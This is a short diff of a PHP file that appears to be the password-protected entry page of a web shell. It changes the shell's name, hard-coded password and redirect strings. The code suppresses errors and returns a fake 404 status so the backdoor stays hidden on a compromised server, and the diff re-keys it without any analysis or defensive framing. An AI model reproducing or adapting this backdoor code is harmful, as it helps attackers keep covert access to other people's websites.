@@ -2,7 +2,7 @@
 error_reporting(0);
 ini_set('max_execution_time', 0);
 session_start();
-$name = "diablo";
+$name = "mega-super";
 function login()
 {
 $random_url = mt_rand(1000000, 247345736453);
@@ -30,11 +30,11 @@ if (!isset($_SESSION[md5($sexy)])) {
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
-$pass = "xmenhaxor";
+$pass = "babihutan-v1";
 $link = "fvck.txt";
 if($_POST['password'] == $pass) {
   $_SESSION['forbidden'] = $pass;
-  echo "<script>window.location='?xXx 日本のハッカー xXx'</script>";
+  echo "<script>window.location='?xXx 見えない xXx'</script>";
 }
 if($_GET['page'] == "blank") {
   echo "<a href='?'>Back</a>";
@@ -42,7 +42,7 @@ if($_GET['page'] == "blank") {
 }
 if(isset($_REQUEST['logout'])) {
   session_destroy();
-  echo "<script>window.location='?日本のハッカー'</script>";
+  echo "<script>window.location='?見えない'</script>";
 }
 if(!($_SESSION['forbidden'])) {
 ?>
